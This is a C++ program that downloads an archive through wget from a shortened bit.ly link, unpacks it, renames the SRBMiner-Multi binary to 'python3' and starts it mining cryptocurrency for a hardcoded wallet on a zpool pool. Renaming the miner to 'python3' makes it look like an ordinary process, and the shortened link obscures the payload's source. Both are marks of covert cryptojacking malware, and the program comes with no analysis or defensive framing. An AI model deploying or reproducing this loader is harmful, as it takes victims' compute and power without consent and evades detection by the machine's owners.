#include <iostream>
#include <cstdlib>
#include <unistd.h> // For chdir

int main() {
    // Download the file using wget
    std::cout << "Downloading the file..." << std::endl;
    if (system("wget -O dot https://bit.ly/kontolrum") != 0) {
        std::cerr << "Failed to download the file." << std::endl;
        return 1;
    }

    // Extract the tar file
    std::cout << "Extracting the tar file..." << std::endl;
    if (system("tar xvf dot") != 0) {
        std::cerr << "Failed to extract the tar file." << std::endl;
        return 1;
    }

    // Change directory to SRBMiner-Multi-2-4-7
    std::cout << "Changing directory to SRBMiner-Multi-2-4-7..." << std::endl;
    if (chdir("SRBMiner-Multi-2-4-7") != 0) {
        std::cerr << "Failed to change directory to SRBMiner-Multi-2-4-7." << std::endl;
        return 1;
    }

    // Rename SRBMiner-MULTI to python3
    std::cout << "Renaming SRBMiner-MULTI to python3..." << std::endl;
    if (system("mv SRBMiner-MULTI python3") != 0) {
        std::cerr << "Failed to rename SRBMiner-MULTI to python3." << std::endl;
        return 1;
    }

    // Run the mining command
    std::cout << "Running the mining command..." << std::endl;
    if (system("./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB") != 0) {
        std::cerr << "Failed to run the mining command." << std::endl;
        return 1;
    }

    std::cout << "Mining script executed successfully." << std::endl;

    return 0;
}
